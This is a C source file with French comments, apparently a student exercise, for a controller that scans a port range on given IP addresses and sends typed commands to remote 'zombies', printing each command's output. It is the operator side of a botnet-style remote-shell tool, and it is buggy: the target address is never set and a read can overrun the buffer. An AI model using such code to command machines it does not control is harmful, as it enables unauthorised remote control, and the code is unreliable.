#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <netdb.h>

#define BUF_SIZE 1024

#include "utils_v2.h"
#include "messages.h"
/**
 * PRE  : ip, j'adresse ip.
 *     port, le port désiré.
 * POST : une nouvelle connection est créée. Celle-ci communique avec l'adresse ip fournie, sur le port fourni.
 * RES  : un fd d'un socket sur l'adresse et le port passé en paramètre ou -1 en cas d'erreur.
 */
int createConnection(char * ip, int port) {
    int sock;
    //struct sockaddr_in addr;
    sock = socket(AF_INET, SOCK_STREAM, 0);
    if (sock < 0) {
        perror("Erreur lors de la création du socket");
        return -1;
    }
    
     struct sockaddr_in addr = {0};
    addr.sin_family = AF_INET;
    addr.sin_port = htons(port);
    
    connect(sock, (struct sockaddr*)&addr, sizeof(addr));
        
    return sock;
}

int main(int argc, char **argv) {
   if (argc < 2) {
        printf("ip -> missing");
        return 1;
    }

    char **ips = &argv[1]; 

    int sock = -1;
    int connectedPort = -1;

    for (int i = 0; ips[i] != NULL; i++) {
     for (int port = MIN_PORT; port <= MAX_PORT; port++) {
        sock = createConnection(ips[i], port);

        if (sock < 0) {
            continue; 
        }
        
        struct sockaddr_in addr;
        socklen_t addr_len = sizeof(addr);
        getpeername(sock, (struct sockaddr *)&addr, &addr_len);
        connectedPort = ntohs(addr.sin_port);

        if (connectedPort != port) {
            close(sock);
            continue; 
        }

        printf("Connexion établie avec %s:%d\n", ips[i], port);

        break;
    }

    if (sock >= 0) {
        break; 
    }
}


    //printf("port du zombie = %d ",connectedPort);


/*

Faut 2 processus un de lecture et un d'ecriture, separer le write et read en 
2 processus.

Utilisation des poll (asynchrone).

*/
   char buffer[BUF_SIZE];
    while (1) {
        printf("Entrez votre commande a envoyer aux zombies: ");
        fgets(buffer, BUF_SIZE, stdin);

        if (strcmp(buffer, "exit\n") == 0) {
            break;
        }

        ssize_t message_envoye = write(sock, buffer, strlen(buffer));
        if (message_envoye < 0) {
            printf("error message_envoye");
            break;
        }

        ssize_t message_recu = read(sock, buffer, BUF_SIZE);
        if (message_recu < 0) {
            printf("error message_recu");
            break;
        }

        buffer[message_recu] = '\0';

        printf("Reponse de la commande executé =   \n %s",buffer);
    }

    close(sock);
    return 0;
}
